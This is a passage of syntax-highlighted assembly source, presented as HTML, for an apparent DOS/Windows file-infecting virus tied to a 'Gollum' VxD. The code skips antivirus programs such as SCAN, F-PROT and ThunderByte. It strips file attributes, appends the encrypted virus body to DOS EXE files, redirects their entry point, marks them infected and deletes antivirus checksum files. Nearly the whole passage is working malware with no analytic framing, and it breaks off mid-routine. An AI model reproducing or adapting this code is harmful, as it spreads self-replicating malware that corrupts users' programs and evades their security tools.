    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">":C"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">
</span><span class="sc5">Look_End</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc1">;Find null marker into filename</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Look_End</span><span class="sc0">
</span><span class="sc5">Found_Tail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Search begin of file name</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
</span><span class="sc5">Look_Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">std</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc1">;Do not infect files with V character in their names</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"V"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">
    </span><span class="sc1">;Do not infect files with digit in their names</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Check_Start</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"9"</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">
</span><span class="sc5">Check_Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Check_Names</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Look_Start</span><span class="sc0">
    </span><span class="sc1">;Begin of file name not found, tchhh...</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">
</span><span class="sc5">Check_Names</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc1">;Save pointer to file name start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Start_FileName</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc1">;Check for SCAN</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"NACS"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">
    </span><span class="sc1">;Check for F-PROT</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"RP-F"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">  
    </span><span class="sc1">;Avoid THUNDERBYTE shit</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"BT"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">  
    </span><span class="sc1">;Get file attr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Infect_FileName</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">
    </span><span class="sc1">;Save file attr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_attr</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc1">;Wipe out attr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Infect_Error</span><span class="sc0">
    </span><span class="sc1">;Open file to infect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Infect_FileName</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Restore_Attr</span><span class="sc0">
    </span><span class="sc1">;Get file handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Victim_Handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;Get file date/time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Infect_Close</span><span class="sc0">
    </span><span class="sc1">;Save file date time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc1">;Read file header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Header_Size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">File_Header</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">        
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Seek to EOF and get real file size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Seek_File_End</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Do not infect too small files</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DOS_Virus_Size</span><span class="sc4">+</span><span class="sc5">VxD_Size</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
</span><span class="sc5">Test_EXE_File</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc1">;Point esi to file header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">File_Header</span><span class="sc0">
    </span><span class="sc1">;Check dos .EXE file type mark</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Check if file is infected</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"CR"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Don't infect Windows files or above</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Don't infect overlays</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Check maxmem field</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Save entry point</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;Crypt it!</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOS_Virus_Code</span><span class="sc4">+</span><span class="sc2">0177h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;Make a copy of .exe file header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Header_Copy</span><span class="sc0">        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Header_Size</span><span class="sc0">
</span><span class="sc5">Copy_Loop</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Copy_Loop</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc1">;Get file size into dx:ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc1">;Get file size div 10h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc1">;Sub header size</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;New entry point at EOF</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;Save delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOS_Virus_Code</span><span class="sc4">+</span><span class="sc2">0001h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc1">;Set new offset of stack segment in load module</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;Set new stack pointer beyond end of virus</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DOS_Virus_Size</span><span class="sc4">+</span><span class="sc5">VxD_Size</span><span class="sc4">+</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc1">;Aligment</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc1">;Get file size into dx:ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc1">;Get file size div 0200h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Size_Round_1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Size_Round_1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Check if file size is as header says</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Get file size into dx:ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc1">;Add virus size to file size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DOS_Virus_Size</span><span class="sc4">+</span><span class="sc5">VxD_Size</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
    </span><span class="sc1">;Get infected file size div 0200h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Size_Round_2</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Size_Round_2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Store new size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;Write DOS virus area next to EOF</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DOS_Virus_Size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">DOS_Virus_Code</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Open Gollum VxD file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_File_Name</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Restore_Date_Time</span><span class="sc0">
    </span><span class="sc1">;Save file handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Gollum_Handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Read_VxD_Block</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Read VxD file block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Gollum_Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_Buffer</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;Encrypt block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc5">Crypt_Loop_3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Crypt_Loop_3</span><span class="sc0">
    </span><span class="sc1">;Write block        </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Victim_Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">        
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Read_VxD_Block</span><span class="sc0">
    </span><span class="sc1">;Close file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Gollum_Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc1">;Seek to beginning of file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Victim_Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Seek_File_Start</span><span class="sc0">
    </span><span class="sc1">;Mark file as infected</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">File_Header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"CR"</span><span class="sc0">
    </span><span class="sc1">;Write new header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Header_Size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc1">;Delete ANTI-VIR.DAT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">CheckSum_File_00</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delete_File</span><span class="sc0">
    </span><span class="sc1">;Delete CHKLIST.TAV</span><span class="sc0">
